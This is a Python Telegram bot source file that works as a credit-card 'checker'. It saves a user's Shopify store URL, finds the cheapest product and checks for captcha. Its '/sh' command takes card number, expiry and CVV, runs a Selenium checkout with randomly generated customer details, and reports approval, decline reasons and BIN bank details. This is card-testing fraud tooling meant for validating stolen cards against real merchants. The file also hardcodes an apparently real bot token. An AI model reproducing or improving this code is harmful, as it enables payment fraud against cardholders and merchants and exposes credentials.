import telebot
import time
from shopify_checkout_checker_selenium import ShopifyChecker
from utils import (
    generate_random_customer_details,
    is_shopify_store,
    get_shopify_lowest_price,
    detect_captcha,
    load_stored_urls,
    save_stored_urls,
    escape_markdown_v2 # Ensure this is imported correctly
)
from urllib.parse import urlparse
import requests
import re # Import re for regex operations

# --- Your Bot Token ---
BOT_TOKEN = "7183286170:AAHyG_2X_GIRIMk8P9deghER_8uQmiusBiA" # <<< IMPORTANT: Replace with your actual bot token

bot = telebot.TeleBot(BOT_TOKEN)

# Instantiate your checker for Selenium operations
shopify_checker = ShopifyChecker()

BOT_BY_INFO = "Pritam Pal" # Replace with your bot's creator info

# Load stored URLs at startup (maps user_id to URL)
STORED_URLS = load_stored_urls()

# Command to add a URL and analyze it
@bot.message_handler(commands=['addurl'])
def add_url_command(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id) # Convert to string for dictionary key
    args = message.text.split(' ', 1)

    if len(args) < 2:
        bot.reply_to(message, escape_markdown_v2("Usage: `/addurl <URL>`\n\nExample: `/addurl https://flipmits.com`"), parse_mode="MarkdownV2")
        return

    url = args[1].strip()

    # Basic URL validation - these initial replies are simple, Markdown only for backticks
    if not url.startswith(('http://', 'https://')):
        bot.reply_to(message, escape_markdown_v2("❌ Invalid URL format. Please include `http://` or `https://`."), parse_mode="MarkdownV2")
        return

    parsed_url = urlparse(url)
    if not parsed_url.netloc:
        bot.reply_to(message, escape_markdown_v2("❌ Invalid URL. Could not parse hostname."), parse_mode="MarkdownV2")
        return

    bot.send_chat_action(chat_id, 'typing')
    processing_msg = bot.reply_to(message, escape_markdown_v2(f"Analyzing URL: `{url}`..."), parse_mode="MarkdownV2")

    response_status = "N/A"
    payment_gateway = "Unknown"
    lowest_amount_info = "N/A"
    captcha_status = "N/A"
    url_saved_status = "Failed to save"

    try:
        # 1. Check HTTPS Response
        http_response = requests.get(url, timeout=10)
        response_status = f"HTTPS response {http_response.status_code}"

        if http_response.status_code == 200:
            # 2. Detect Payment Gateway (Shopify specific for now)
            if is_shopify_store(url):
                payment_gateway = "Shopify"
                # If Shopify, get lowest price
                lowest_price_result = get_shopify_lowest_price(url)
                if lowest_price_result["status"] == "success":
                    # Update shopify_checker's store URL and product info for future /sh commands
                    shopify_checker.set_store_url(url)
                    shopify_checker.lowest_product_info = lowest_price_result["data"]
                    # Store the URL with product info to ensure context
                    shopify_checker.lowest_product_info['store_url'] = url
                    lowest_amount_info = f"${lowest_price_result['data']['price']:.2f} {lowest_price_result['data']['currency']}"
                else:
                    lowest_amount_info = f"Failed to get lowest price: {lowest_price_result['message']}"
            else:
                payment_gateway = "Not Shopify (automated detection limited)"

            # 3. Detect Captcha
            if detect_captcha(url):
                captcha_status = "hCaptcha (mechanism detected)"
            else:
                captcha_status = "No hCaptcha detected (may vary by page)"

            # 4. Save URL and User ID
            STORED_URLS[user_id] = url # Overwrite if user adds new URL
            save_stored_urls(STORED_URLS)
            url_saved_status = "Url Saved successfully"
        else:
            payment_gateway = "N/A (HTTP error)"
            lowest_amount_info = "N/A (HTTP error)"
            captcha_status = "N/A (HTTP error)"
            url_saved_status = "Not saved due to HTTP error"

    except requests.exceptions.ConnectionError:
        response_status = "Failed to connect"
        url_saved_status = "Not saved due to connection error"
    except requests.exceptions.Timeout:
        response_status = "Request timed out"
        url_saved_status = "Not saved due to timeout"
    except Exception as e:
        response_status = f"Error: {str(e)}"
        url_saved_status = "Not saved due to internal error"

    # All literal parts and dynamic parts (except for literal ` ` for code) are now escaped
    response_message = (
        f"`{escape_markdown_v2(url)}`\n"
        f"{escape_markdown_v2('HTTPS response')} {escape_markdown_v2(response_status)}\n"
        f"{escape_markdown_v2('Payment Gateway:')} {escape_markdown_v2(payment_gateway)}\n"
        f"{escape_markdown_v2('Lowest Amount:')} {escape_markdown_v2(lowest_amount_info)}\n"
        f"{escape_markdown_v2('Captcha:')} {escape_markdown_v2(captcha_status)}\n"
        f"{escape_markdown_v2(url_saved_status)}"
    )
    bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id, text=response_message, parse_mode="MarkdownV2")


# Command to check a card via checkout - '/sh' command
@bot.message_handler(commands=['sh'])
def sh_card_check(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id)
    args = message.text.split(' ', 1)

    if len(args) < 2:
        bot.reply_to(message,
                     escape_markdown_v2("Usage: `/sh <CC|MM|YY|CVV>`\n\n"
                     "Example: `/sh 4000123456789012|12|25|123`"),
                     parse_mode="MarkdownV2")
        return

    card_string = args[1].strip()

    # Extract BIN for lookup
    card_number_only = card_string.split('|')[0]
    if not card_number_only.isdigit() or len(card_number_only) < 6:
        bot.reply_to(message, escape_markdown_v2("❌ Invalid card format or card number missing for BIN lookup. Please use `CC|MM|YY|CVV`."), parse_mode="MarkdownV2")
        return
    bin_number = card_number_only[:6]

    # Use the URL saved by the user
    if user_id not in STORED_URLS:
        bot.reply_to(message, escape_markdown_v2("Please add a Shopify store URL first using `/addurl <URL>`."), parse_mode="MarkdownV2")
        return

    current_shopify_url = STORED_URLS[user_id]

    # Ensure the shopify_checker is set to the correct URL for this user's context
    shopify_checker.set_store_url(current_shopify_url)

    if not shopify_checker.shopify_store_url:
        bot.reply_to(message, escape_markdown_v2("Shopify store URL is not set. Please use `/addurl <URL>` first."), parse_mode="MarkdownV2")
        return

    # Re-fetch lowest product info if not already set or if URL changed for robustness
    if not shopify_checker.lowest_product_info or shopify_checker.lowest_product_info.get('store_url') != current_shopify_url:
        bot.send_chat_action(chat_id, 'typing')
        product_msg = bot.reply_to(message, escape_markdown_v2("Finding lowest product for checkout..."), parse_mode="MarkdownV2")
        product_result = get_shopify_lowest_price(current_shopify_url)

        if product_result["status"] == "success":
            shopify_checker.lowest_product_info = product_result["data"]
            shopify_checker.lowest_product_info['store_url'] = current_shopify_url

            # Apply escape_markdown_v2 to the entire f-string before passing it
            # This handles '-->', '.', and any special chars in the title/price itself.
            display_text = f"✅ Product found: {shopify_checker.lowest_product_info['title']} --> ${shopify_checker.lowest_product_info['price']:.2f}"
            bot.edit_message_text(chat_id=chat_id, message_id=product_msg.message_id,
                                  text=escape_markdown_v2(display_text),
                                  parse_mode="MarkdownV2")
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=product_msg.message_id, text=escape_markdown_v2(f"❌ Error: Could not get product info: {product_result['message']}"), parse_mode="MarkdownV2")
            return

    if not shopify_checker.lowest_product_info:
        bot.reply_to(message, escape_markdown_v2("❌ Cannot proceed without product information. Please try `/addurl` again or check the store."), parse_mode="MarkdownV2")
        return

    # --- Generate random customer details for this checkout attempt ---
    customer_details = generate_random_customer_details()
    print(f"Using generated customer details: {customer_details}")

    bot.send_chat_action(chat_id, 'typing')
    processing_msg = bot.reply_to(message, escape_markdown_v2(f"```\nProcessing Card: {card_number_only[:6]}xxxxxx\n```\n_Using random details. This may take a moment..._"), parse_mode="MarkdownV2")

    # --- Perform the card check with Selenium using generated details ---
    check_result = shopify_checker.check_card_with_selenium(card_string, customer_details)

    # --- Perform BIN lookup ---
    bin_details = {"scheme_type_brand": "N/A", "bank": "N/A", "country": "N/A", "country_emoji": ""}
    bin_lookup_response = shopify_checker.get_bin_details(bin_number)
    if bin_lookup_response["status"] == "success":
        bin_details = bin_lookup_response["data"]

    # --- Format the response ---
    status_emoji = "✅ APPROVED" if check_result['status'] == "order_placed" else "❌ DECLINE"

    # Custom message for decline/3ds
    message_text = check_result['message']
    if check_result['status'] == "card_declined":
        message_text = "Card declined."
        if "Incorrect CVV" in check_result['message']:
            message_text = "Card declined (Incorrect CVV)"
        elif "Insufficient Funds" in check_result['message']:
            message_text = "Card declined (Insufficient Funds)"
        elif "Invalid Card Number" in check_result['message']:
            message_text = "Card declined (Invalid Card Number)"
        elif "Card Expired" in check_result['message']:
            message_text = "Card declined (Card Expired)"
        elif "AVS mismatch" in check_result['message']:
            message_text = "Card declined (AVS Mismatch)"
        elif "Generic Decline" in check_result['message']:
            message_text = "Card declined (Generic Reason)"

        if shopify_checker.lowest_product_info and shopify_checker.lowest_product_info['price'] != 'N/A':
             message_text += f" --> Attempted ${shopify_checker.lowest_product_info['price']:.2f} {shopify_checker.lowest_product_info.get('currency', 'USD')}"

    elif check_result['status'] == "3ds_required":
        message_text = "3DS REQUIRED"
    elif check_result['status'] == "automation_error":
        message_text = f"Automation Error: {check_result['message']}"
    elif check_result['status'] == "unknown_outcome":
        message_text = f"Unknown Outcome: {check_result['message']}"
    elif check_result['status'] == "product_not_found":
        message_text = "Product not found for checkout. Please check the URL or use `/addurl` again."


    # Apply escape_markdown_v2 to all literal text segments and dynamic values
    # The structure now uses string concatenation of escaped parts and specific MarkdownV2 formatting.
    final_response = (
        escape_markdown_v2("点 CARD --> ") + "`" + escape_markdown_v2(card_string) + "`\n" +
        escape_markdown_v2("━━━━━━━━━━━━━━") + "\n" +
        escape_markdown_v2("点 STATUS --> ") + status_emoji + "\n" +
        escape_markdown_v2("点 MESSAGE --> ") + escape_markdown_v2(message_text) + "\n" +
        escape_markdown_v2("点 GATEWAY --> ") + escape_markdown_v2("Shopify") + "\n" +
        escape_markdown_v2("═════[BANK DETAILS]═════") + "\n" + # Brackets are escaped by escape_markdown_v2
        escape_markdown_v2("点 BIN --> ") + escape_markdown_v2(bin_details['scheme_type_brand']) + "\n" +
        escape_markdown_v2("点 BANK --> ") + escape_markdown_v2(bin_details['bank']) + "\n" +
        escape_markdown_v2("点 COUNTRY --> ") + escape_markdown_v2(bin_details['country']) + " " + bin_details['country_emoji'] + "\n" +
        escape_markdown_v2("═════[INFO]═════") + "\n" + # Brackets are escaped by escape_markdown_v2
        escape_markdown_v2("点 TIME --> ") + "`" + escape_markdown_v2(f'{check_result["time_taken"]:.2f}') + " seconds`\n" +
        escape_markdown_v2("点 BOT BY --> ") + escape_markdown_v2(BOT_BY_INFO)
    )

    bot.edit_message_text(chat_id=chat_id, message_id=processing_msg.message_id, text=final_response, parse_mode="MarkdownV2")

# --- Start the bot polling ---
print("Bot is running...")
bot.polling(none_stop=True)
